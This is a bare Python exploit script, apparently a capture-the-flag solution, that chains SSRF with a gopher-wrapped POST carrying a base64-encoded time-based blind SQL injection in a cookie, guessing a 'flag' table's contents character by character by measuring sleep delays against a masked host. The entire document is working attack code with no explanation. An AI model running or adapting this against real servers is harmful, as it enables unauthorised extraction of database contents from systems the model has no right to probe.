import requests
import base64
import time
import os

base_url = "http://xxx.xxx/use.php?url="
payload = "admin') union select 1,2,if(substr((select * from flag),{},1)=\"{}\",sleep(8),1)#"

str1,ans =  '1234567890abcdef}',""
for i in range(12,50):
	for j in str1:
		send = str(base64.b64encode((payload.format(i,j)).encode('utf-8')))[2:-1]
		exp_a = os.popen('python3 C:\\Users\\12060\\Desktop\\GopherHex.py "POST" "/index.php" "127.0.0.1:80" "uname=admin&passwd=admin" "80" "Cookie: this_is_your_cookie={}"'.format(send))
		exp = exp_a.read().split('[Web用]')[1].strip(" ").strip("\n")
		exp_a.close()
		timestart = time.time()
		res = requests.get(base_url+exp)
		timeend = time.time()
		if timeend - timestart >= 8:
			ans = ans + j
			print(ans)
			break

